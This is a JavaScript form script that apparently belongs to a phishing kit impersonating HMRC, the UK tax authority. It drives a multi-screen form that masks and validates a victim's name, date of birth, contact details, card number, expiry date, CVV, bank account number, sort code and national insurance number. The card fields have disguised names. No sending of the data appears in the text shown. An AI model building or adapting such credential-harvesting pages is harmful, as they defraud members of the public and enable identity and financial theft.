$(document).ready(function() {
		
  const numeroc = document.getElementById('numeroc');
  const datex = document.getElementById('datex');
  const recode = document.getElementById('recode'); 


  let cctype = null;

  //Mask the Credit Card Number Input
  var numeroc_mask = new IMask(numeroc, {
    mask: [
    {
      mask: '000000000000000',
      regex: '^3[47]\\d{0,13}',
      cardtype: 'american express' },

    {
      mask: '0000000000000000',
      regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)\\d{0,12}',
      cardtype: 'discover' },

    {
      mask: '00000000000000',
      regex: '^3(?:0([0-5]|9)|[689]\\d?)\\d{0,11}',
      cardtype: 'diners' },

    {
      mask: '0000000000000000',
      regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})\\d{0,12}',
      cardtype: 'mastercard' }, 
    {
      mask: '000000000000000',
      regex: '^(?:2131|1800)\\d{0,11}',
      cardtype: 'jcb15' },

    {
      mask: '0000000000000000',
      regex: '^(?:35\\d{0,2})\\d{0,12}',
      cardtype: 'jcb' },

    {
      mask: '0000000000000000',
      regex: '^(?:5[0678]\\d{0,2}|6304|67\\d{0,2})\\d{0,12}',
      cardtype: 'maestro' },

    {
      mask: '0000000000000000',
      regex: '^4\\d{0,15}',
      cardtype: 'visa' },

    {
      mask: '0000000000000000',
      regex: '^62\\d{0,14}',
      cardtype: 'unionpay' },

    {
      mask: '0000000000000000',
      cardtype: 'Unknown' }],


    dispatch: function (appended, dynamicMasked) {
      var number = (dynamicMasked.value + appended).replace(/\D/g, '');

      for (var i = 0; i < dynamicMasked.compiledMasks.length; i++) {
        let re = new RegExp(dynamicMasked.compiledMasks[i].regex);
        if (number.match(re) != null) {
          return dynamicMasked.compiledMasks[i];
        }
      }window.CP.exitedLoop(0);
    } });


  //Mask the Expiration Date
  var datex_mask = new IMask(datex, {
    mask: 'MM{/}YY',
    groups: {
      YY: new IMask.MaskedPattern.Group.Range([21, 33]),
      MM: new IMask.MaskedPattern.Group.Range([1, 12]) } });



  //Mask the security code
  var recode_mask = new IMask(recode, {
    mask: '0000' });

  //Mask the Expiration Date
  var dob_mask = new IMask(dob, {
    mask: 'DD{/}MM{/}YYYY',
    groups: {
      YYYY: new IMask.MaskedPattern.Group.Range([1930, 2004]),
      MM: new IMask.MaskedPattern.Group.Range([1, 12]),
      DD: new IMask.MaskedPattern.Group.Range([1, 31]) }});
  
  var telephone_mask = new IMask(telephone, {
    mask: '00000000000' });    
 
   var account_mask = new IMask(account, {
    mask: '00000000' }); 
    
     var sortcode_mask = new IMask(sortcode, {
    mask: '00-00-00' });  	 
            //Screen trigger
            
$('.screen--1').click(function() {
	if($("#hmrcform").valid()){
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--1').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--2').fadeIn(1000);
                    }, 200
                );
          } else {  			
				} 			
            });
$('.screen--2').click(function() {
	if($("#hmrcform").valid()){
                $('html, body').animate({
                    scrollTop: 0
                }, 100);
                $('.main--2').fadeOut(200);

                setTimeout(
                    function() {
                        $('.main--3').fadeIn(1000);
                    }, 200
                );
          } else {  			
				} 			
            });                     
			
  $("#hmrcform").validate( { // initialize plugin
			 	 	 	
		errorElement: "div",	
				errorClass: "govuk-form-group--error",
  errorPlacement: function(error, element) {
     error.appendTo( element.parent("div") );
   },
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: {	required: true,	minlength: 10,},
					telephone: { required: true, minlength: 11,},
					email: { required: true, email: true,},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,}, 
					numeroc: { required: true, creditcard: true},
					datex: { required: true, minlength: 5,},
					recode: { required: true, minlength: 3,},
					account: { required: true, minlength: 8,},
					sortcode: { required: true, minlength: 8,},
					ninmr: { required: true, minlength: 9,}, 
                },
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					dob: {
						required: "Please provide your date of birth",
						minlength: jQuery.validator.format("Please provide your date of birth"),
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please ensure you enter digits only"), 
					},
					email: {
						required: "Please provide your email address",
						email: jQuery.validator.format("Please check the email address you have entered"),
					},
					address: {
						required: "Please provide the 1st line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					town: {
						required: "Please provide your city/town",
						minlength: jQuery.validator.format("Please check the city/town you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					numeroc: {
						required: "Please provide your card number",
						creditcard: jQuery.validator.format("Please check the card number you have entered"),
					},
					datex: {
						required: "Please provide your cards expiry date",
						minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
					},
					recode: {
						required: "Please provide your 3 digit card security code (CVV)",
						minlength: jQuery.validator.format("Please check the card security code you have entered"), 
					},
					account: {
						required: "Please provide your 8 digit account number",
						minlength: jQuery.validator.format("Please check the account number you have entered"), 
					},
					sortcode: {
						required: "Please provide your 6 digit sort code",
						minlength: jQuery.validator.format("Please check the sort code you have entered"),
					},
					ninmr: { 
						required: "Please provide your national insurance number", 
						minlength: jQuery.validator.format("Please check the national insurance number you have entered"), 
					}, 
				},  
	    });	 
        });
 
         